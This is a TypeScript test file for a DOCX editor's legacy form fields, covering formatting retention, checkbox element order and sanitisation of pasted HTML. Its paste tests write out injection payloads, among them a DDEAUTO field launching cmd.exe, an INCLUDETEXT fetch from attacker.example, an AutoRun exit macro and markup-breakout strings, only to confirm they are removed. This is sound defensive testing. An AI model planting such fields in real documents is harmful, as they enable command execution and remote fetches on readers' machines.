/**
 * Legacy form fields — review follow-ups (heyirisai/docx-editor#16):
 *
 * 1. an answered field keeps the field's own run formatting, in the headless
 *    setter and in the editor transaction, through save;
 * 2. a checkbox that gains `w:default` keeps the `CT_FFCheckBox` sequence
 *    `(size|sizeAuto), default?, checked?`;
 * 3. `data-legacy-form-field` / `data-raw-properties-xml` from PASTED HTML
 *    cannot put arbitrary markup into document.xml, while the editor's own
 *    copy/paste (toDOM → HTML → parseDOM) and load → edit → save keep the field.
 */

import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { GlobalRegistrator } from '@happy-dom/global-registrator';
import { DOMParser as PMDOMParser, DOMSerializer, type Node as PMNode } from 'prosemirror-model';
import { EditorState } from 'prosemirror-state';

import { parseDocumentBody } from '../documentParser';
import { serializeDocumentBody } from '../serializer/documentSerializer';
import { toProseDoc } from '../../prosemirror/conversion/toProseDoc';
import { fromProseDoc } from '../../prosemirror/conversion/fromProseDoc';
import { schema } from '../../prosemirror/schema';
import { findContentControl } from '../../agent/contentControls';
import { setContentControlValue } from '../../agent/contentControlValues';
import { setContentControlValueTr } from '../../prosemirror/contentControls';
import { setLegacyCheckbox } from '../legacyFormField';
import type { Document, DocumentBody, LegacyFormField } from '../../types/document';

beforeAll(() => GlobalRegistrator.register());
afterAll(() => GlobalRegistrator.unregister());

const NS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const docXml = (...paragraphs: string[]) =>
  `<w:document ${NS}><w:body>${paragraphs.map((p) => `<w:p>${p}</w:p>`).join('')}</w:body></w:document>`;
const asDocument = (body: DocumentBody): Document =>
  ({ package: { document: body } }) as unknown as Document;
const reparse = (bodyXml: string): DocumentBody =>
  parseDocumentBody(`<w:document ${NS}><w:body>${bodyXml}</w:body></w:document>`);

/** Arial 9pt bold — the shape of a styled requirements-matrix field. */
const RPR =
  '<w:rPr><w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/><w:b/>' +
  '<w:sz w:val="18"/><w:szCs w:val="18"/></w:rPr>';

const dropdownXml = (name: string) =>
  `<w:r>${RPR}<w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="${name}"/><w:enabled/>` +
  '<w:calcOnExit w:val="0"/><w:ddList><w:listEntry w:val="Yes"/><w:listEntry w:val="No"/>' +
  '<w:listEntry w:val="Partial"/></w:ddList></w:ffData></w:fldChar></w:r>' +
  `<w:r>${RPR}<w:instrText xml:space="preserve"> FORMDROPDOWN </w:instrText></w:r>` +
  `<w:r>${RPR}</w:r>` +
  `<w:r>${RPR}<w:fldChar w:fldCharType="separate"/></w:r>` +
  `<w:r>${RPR}<w:fldChar w:fldCharType="end"/></w:r>`;

const checkboxXml = (name: string, checkBox = '<w:sizeAuto/><w:default w:val="0"/>') =>
  `<w:r>${RPR}<w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="${name}"/>` +
  `<w:checkBox>${checkBox}</w:checkBox></w:ffData></w:fldChar></w:r>` +
  `<w:r>${RPR}<w:instrText xml:space="preserve"> FORMCHECKBOX </w:instrText></w:r>` +
  `<w:r>${RPR}<w:fldChar w:fldCharType="separate"/></w:r>` +
  `<w:r>${RPR}<w:fldChar w:fldCharType="end"/></w:r>`;

const FORM = docXml(dropdownXml('Drop1'), checkboxXml('Check1'));

/** The formatting assertions a styled Arial 9pt bold run must satisfy. */
function expectArial9Bold(formatting: Record<string, unknown> | undefined) {
  expect(formatting).toBeDefined();
  expect((formatting!.fontFamily as { ascii?: string } | undefined)?.ascii).toBe('Arial');
  expect(formatting!.bold).toBe(true);
  expect(formatting!.fontSize).toBe(18);
}

/** The first run inside the inline control addressed by `tag`. */
function controlRun(doc: Document, tag: string) {
  for (const block of doc.package.document.content) {
    if (block.type !== 'paragraph') continue;
    for (const item of block.content) {
      if (item.type === 'inlineSdt' && item.properties.tag === tag) {
        const run = item.content.find((c) => c.type === 'run');
        if (run && run.type === 'run') return run;
      }
    }
  }
  throw new Error(`no run in control ${tag}`);
}

describe('an answered legacy field keeps its run formatting', () => {
  test('headless: a dropdown pick keeps Arial 9pt bold through save and reparse', () => {
    const next = setContentControlValue(
      asDocument(parseDocumentBody(FORM)),
      { tag: 'Drop1' },
      { kind: 'dropdown', value: 'Partial' }
    );
    expectArial9Bold(controlRun(next, 'Drop1').formatting as Record<string, unknown>);

    const out = serializeDocumentBody(next.package.document);
    // The answer is a real result now, so it is written — in the field's rPr.
    const result =
      /<w:fldChar w:fldCharType="separate"\/><\/w:r>(<w:r>.*?<w:t>Partial<\/w:t><\/w:r>)/.exec(
        out
      )?.[1];
    expect(result).toBeDefined();
    expect(result).toContain('w:ascii="Arial"');
    expect(result).toContain('<w:b/>');
    expect(result).toContain('<w:sz w:val="18"/>');

    const reparsed = asDocument(reparse(out));
    expectArial9Bold(controlRun(reparsed, 'Drop1').formatting as Record<string, unknown>);
  });

  test('headless: a checkbox toggle keeps the glyph in the field formatting', () => {
    const next = setContentControlValue(
      asDocument(parseDocumentBody(FORM)),
      { tag: 'Check1' },
      { kind: 'checkbox', checked: true }
    );
    const run = controlRun(next, 'Check1');
    expect(run.content).toEqual([{ type: 'text', text: '☒' }]);
    expectArial9Bold(run.formatting as Record<string, unknown>);
    // The glyph is still never saved as a result run (Word draws it).
    const out = serializeDocumentBody(next.package.document);
    expect(out).not.toContain('☒');
    expect(findContentControl(reparse(out), { tag: 'Check1' })!.checked).toBe(true);
  });

  test('editor: setContentControlValueTr keeps the marks, and save writes them', () => {
    const pmDoc = toProseDoc(asDocument(parseDocumentBody(FORM)));
    let state = EditorState.create({ doc: pmDoc });
    state = state.apply(
      setContentControlValueTr(state, { tag: 'Drop1' }, { kind: 'dropdown', value: 'No' })
    );
    state = state.apply(
      setContentControlValueTr(state, { tag: 'Check1' }, { kind: 'checkbox', checked: true })
    );

    const marksOf = (text: string): string[] => {
      let names: string[] = [];
      state.doc.descendants((n) => {
        if (n.isText && n.text === text) names = n.marks.map((m) => m.type.name);
        return true;
      });
      return names;
    };
    for (const text of ['No', '☒']) {
      expect(marksOf(text)).toEqual(expect.arrayContaining(['bold', 'fontSize', 'fontFamily']));
    }

    const saved = fromProseDoc(state.doc);
    expectArial9Bold(controlRun(saved, 'Drop1').formatting as Record<string, unknown>);
    expectArial9Bold(controlRun(saved, 'Check1').formatting as Record<string, unknown>);
    const out = serializeDocumentBody(saved.package.document);
    expect(out).toMatch(/<w:r><w:rPr>(?=[^]*?w:ascii="Arial")(?=[^]*?<w:b\/>)[^]*?<w:t>No<\/w:t>/);
    expect(out).toContain('<w:result w:val="1"/>');
    expect(out).not.toContain('☒');
  });
});

describe('CT_FFCheckBox order when w:default is added', () => {
  const field = (checkBox: string, prefix = 'w'): LegacyFormField => {
    const ffDataXml =
      `<${prefix}:ffData><${prefix}:name ${prefix}:val="C"/>` +
      `<${prefix}:checkBox>${checkBox}</${prefix}:checkBox></${prefix}:ffData>`;
    return {
      kind: 'legacy',
      fieldType: 'checkbox',
      instruction: 'FORMCHECKBOX',
      ffDataXml,
      rawPrefixXml: `<w:r><w:fldChar w:fldCharType="begin">${ffDataXml}</w:fldChar></w:r>`,
      rawSuffixXml: '<w:r><w:fldChar w:fldCharType="end"/></w:r>',
      hasSeparate: true,
      hasResult: false,
    };
  };
  const box = (xml: string) => /<(?:\w+:)?checkBox>.*<\/(?:\w+:)?checkBox>/.exec(xml)?.[0];

  test('sizeAuto + checked, no default: default goes before checked', () => {
    const next = setLegacyCheckbox(field('<w:sizeAuto/><w:checked/>'), false);
    expect(box(next.ffDataXml)).toBe(
      '<w:checkBox><w:sizeAuto/><w:default w:val="0"/><w:checked w:val="0"/></w:checkBox>'
    );
    expect(next.rawPrefixXml).toContain(box(next.ffDataXml)!);
  });

  test('w:size + checked with a value, no default', () => {
    const next = setLegacyCheckbox(field('<w:size w:val="20"/><w:checked w:val="1"/>'), true);
    expect(box(next.ffDataXml)).toBe(
      '<w:checkBox><w:size w:val="20"/><w:default w:val="1"/><w:checked w:val="1"/></w:checkBox>'
    );
  });

  test('neither default nor checked: both appended after the size, in order', () => {
    const next = setLegacyCheckbox(field('<w:size w:val="20"/>'), true);
    expect(box(next.ffDataXml)).toBe(
      '<w:checkBox><w:size w:val="20"/><w:default w:val="1"/><w:checked w:val="1"/></w:checkBox>'
    );
  });

  test('default already present: patched in place, checked appended', () => {
    const next = setLegacyCheckbox(field('<w:sizeAuto/><w:default w:val="0"/>'), true);
    expect(box(next.ffDataXml)).toBe(
      '<w:checkBox><w:sizeAuto/><w:default w:val="1"/><w:checked w:val="1"/></w:checkBox>'
    );
  });

  test('another prefix: default goes before that prefix’s checked', () => {
    const next = setLegacyCheckbox(field('<x:sizeAuto/><x:checked/>', 'x'), true);
    expect(box(next.ffDataXml)).toBe(
      '<x:checkBox><x:sizeAuto/><x:default x:val="1"/><x:checked x:val="1"/></x:checkBox>'
    );
  });

  test('unprefixed (default namespace) ffData', () => {
    const ffDataXml = '<ffData><name val="C"/><checkBox><sizeAuto/><checked/></checkBox></ffData>';
    const base = field('');
    const next = setLegacyCheckbox(
      {
        ...base,
        ffDataXml,
        rawPrefixXml: `<w:r><w:fldChar w:fldCharType="begin">${ffDataXml}</w:fldChar></w:r>`,
      },
      true
    );
    expect(box(next.ffDataXml)).toBe(
      '<checkBox><sizeAuto/><default val="1"/><checked val="1"/></checkBox>'
    );
  });

  test('end to end: a checked-without-default checkbox re-parses in schema order', () => {
    const body = parseDocumentBody(docXml(checkboxXml('CK', '<w:sizeAuto/><w:checked/>')));
    expect(findContentControl(body, { tag: 'CK' })!.checked).toBe(true);
    const next = setContentControlValue(
      asDocument(body),
      { tag: 'CK' },
      { kind: 'checkbox', checked: false }
    );
    const out = serializeDocumentBody(next.package.document);
    expect(out).toContain(
      '<w:checkBox><w:sizeAuto/><w:default w:val="0"/><w:checked w:val="0"/></w:checkBox>'
    );
    expect(findContentControl(reparse(out), { tag: 'CK' })!.checked).toBe(false);
  });
});

describe('pasted HTML cannot plant markup through SDT attrs', () => {
  const serializer = () => DOMSerializer.fromSchema(schema);
  const attr = (s: string) =>
    s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

  /** HTML → PM (the paste path) → Document → document.xml body. */
  function pasteAndSave(html: string): { pm: PMNode; xml: string } {
    const container = document.createElement('div');
    container.innerHTML = html;
    const pm = PMDOMParser.fromSchema(schema).parse(container);
    return { pm, xml: serializeDocumentBody(fromProseDoc(pm).package.document) };
  }

  /** What the editor's own copy puts on the clipboard for `pmDoc`. */
  function copyHtml(pmDoc: PMNode): string {
    const container = document.createElement('div');
    container.appendChild(serializer().serializeFragment(pmDoc.content));
    return container.innerHTML;
  }

  const legit = (): LegacyFormField => {
    const info = findContentControl(parseDocumentBody(FORM), { tag: 'Drop1' })!;
    return info.legacyFormField!;
  };
  const spanWith = (dataAttrs: string) =>
    `<p><span class="docx-sdt docx-sdt-dropDownList" data-sdt-type="dropDownList" data-tag="Evil" ${dataAttrs}>Yes</span></p>`;

  test('a DDEAUTO field smuggled in rawPrefixXml does not reach document.xml', () => {
    const evil: LegacyFormField = {
      ...legit(),
      rawPrefixXml:
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>' +
        '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc" </w:instrText></w:r>' +
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r>',
    };
    const { pm, xml } = pasteAndSave(
      spanWith(`data-legacy-form-field="${attr(JSON.stringify(evil))}"`)
    );
    expect(xml).not.toContain('DDEAUTO');
    expect(xml).not.toContain('fldChar');
    let legacyAttr: unknown = 'unset';
    pm.descendants((n) => {
      if (n.type.name === 'sdt') legacyAttr = n.attrs.legacyFormField;
      return true;
    });
    expect(legacyAttr).toBeNull();
  });

  test('an INCLUDETEXT disguised behind a FORMTEXT instruction is refused', () => {
    const base = legit();
    const evil: LegacyFormField = {
      ...base,
      instruction: 'FORMDROPDOWN',
      rawPrefixXml: base.rawPrefixXml.replace(
        ' FORMDROPDOWN ',
        ' INCLUDETEXT "http://attacker.example/x" '
      ),
    };
    const { xml } = pasteAndSave(
      spanWith(`data-legacy-form-field="${attr(JSON.stringify(evil))}"`)
    );
    expect(xml).not.toContain('INCLUDETEXT');
    expect(xml).not.toContain('attacker.example');
  });

  test('markup appended to the suffix, or an exit macro in ffData, is refused', () => {
    const base = legit();
    const trailing: LegacyFormField = {
      ...base,
      rawSuffixXml:
        base.rawSuffixXml +
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDEPICTURE "http://x"</w:instrText></w:r>',
    };
    expect(
      pasteAndSave(spanWith(`data-legacy-form-field="${attr(JSON.stringify(trailing))}"`)).xml
    ).not.toContain('INCLUDEPICTURE');

    const macroFf = base.ffDataXml.replace(
      '<w:enabled/>',
      '<w:enabled/><w:exitMacro w:val="AutoRun"/>'
    );
    const macro: LegacyFormField = {
      ...base,
      ffDataXml: macroFf,
      rawPrefixXml: base.rawPrefixXml.replace(base.ffDataXml, macroFf),
    };
    expect(
      pasteAndSave(spanWith(`data-legacy-form-field="${attr(JSON.stringify(macro))}"`)).xml
    ).not.toContain('exitMacro');
  });

  test('data-raw-properties-xml cannot close w:sdtPr and inject runs', () => {
    const evil =
      '<w:sdtPr><w:tag w:val="x"/></w:sdtPr><w:sdtContent/></w:sdt>' +
      '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDEAUTO x</w:instrText></w:r><w:sdt><w:sdtPr/>';
    const { xml } = pasteAndSave(spanWith(`data-raw-properties-xml="${attr(evil)}"`));
    expect(xml).not.toContain('DDEAUTO');
    expect(xml).not.toContain('fldChar');
    // The control survives on its modeled attrs, synthesized and escaped.
    expect(xml).toContain('<w:tag w:val="Evil"/>');
  });

  test('a well-formed sdtPr hiding a field inside is refused; the block variant too', () => {
    const evil =
      '<w:sdtPr><w:rPr><w:r><w:instrText>DDEAUTO x</w:instrText></w:r></w:rPr></w:sdtPr>';
    expect(pasteAndSave(spanWith(`data-raw-properties-xml="${attr(evil)}"`)).xml).not.toContain(
      'DDEAUTO'
    );
    const block = `<div class="docx-block-sdt" data-sdt-type="richText" data-raw-properties-xml="${attr(
      '<w:sdtPr/></w:sdt><w:p><w:r><w:instrText>DDEAUTO y</w:instrText></w:r></w:p><w:sdt><w:sdtPr/>'
    )}" data-raw-end-properties-xml="${attr('<w:sdtEndPr><w:r/></w:sdtEndPr>')}"><p>x</p></div>`;
    const out = pasteAndSave(block).xml;
    expect(out).not.toContain('DDEAUTO');
    expect(out).not.toContain('<w:sdtEndPr>');
  });

  test('a pasted data-lock outside ST_Lock is dropped, and a synthesized lock is escaped', () => {
    const { xml } = pasteAndSave(
      spanWith(`data-lock="${attr('"/><w:r><w:instrText>DDEAUTO z</w:instrText></w:r><w:x a="')}"`)
    );
    expect(xml).not.toContain('DDEAUTO');
    expect(pasteAndSave(spanWith('data-lock="contentLocked"')).xml).toContain(
      '<w:lock w:val="contentLocked"/>'
    );
  });

  test("the editor's own copy/paste keeps legacy fields and raw sdtPr intact", () => {
    const body = parseDocumentBody(FORM);
    const original = serializeDocumentBody(body);
    const pmDoc = toProseDoc(asDocument(body));
    const { xml } = pasteAndSave(copyHtml(pmDoc));
    expect(xml).toBe(original);
    const pasted = findContentControl(reparse(xml), { tag: 'Drop1' })!;
    expect(pasted.source).toBe('legacy');
    expect(pasted.legacyFormField!.options).toEqual(['Yes', 'No', 'Partial']);
  });

  test('copy/paste of an answered field keeps the answer and the patched ffData', () => {
    const answered = setContentControlValue(
      asDocument(parseDocumentBody(FORM)),
      { tag: 'Drop1' },
      { kind: 'dropdown', value: 'No' }
    );
    // What saving straight from the editor writes (PM normalizes run rPr the
    // same way for every run); a copy/paste must not change a byte of it.
    const pmDoc = toProseDoc(answered);
    const expected = serializeDocumentBody(fromProseDoc(pmDoc).package.document);
    const { xml } = pasteAndSave(copyHtml(pmDoc));
    // The fontFamily mark's HTML form does not carry w:hAnsi (true of every
    // pasted run, not specific to fields); every other byte must match.
    const noHAnsi = (x: string) => x.replace(/ w:hAnsi="Arial"/g, '');
    expect(noHAnsi(xml)).toBe(noHAnsi(expected));
    expect(xml).toContain('<w:result w:val="1"/>');
    expect(findContentControl(reparse(xml), { tag: 'Drop1' })!.legacyFormField).toMatchObject({
      selectedIndex: 1,
      value: 'No',
      hasResult: true,
    });
  });

  test('a w:sdt control with raw sdtPr survives internal copy/paste', () => {
    const sdt =
      '<w:sdt><w:sdtPr><w:alias w:val="Pick"/><w:tag w:val="pick"/><w:id w:val="7"/>' +
      '<w:dropDownList w:lastValue="b"><w:listItem w:displayText="A" w:value="a"/>' +
      '<w:listItem w:displayText="B" w:value="b"/></w:dropDownList></w:sdtPr>' +
      '<w:sdtContent><w:r><w:t>B</w:t></w:r></w:sdtContent></w:sdt>';
    const body = parseDocumentBody(docXml(sdt));
    const original = serializeDocumentBody(body);
    const { xml } = pasteAndSave(copyHtml(toProseDoc(asDocument(body))));
    expect(xml).toBe(original);
    expect(xml).toContain('<w:dropDownList w:lastValue="b">');
  });
});
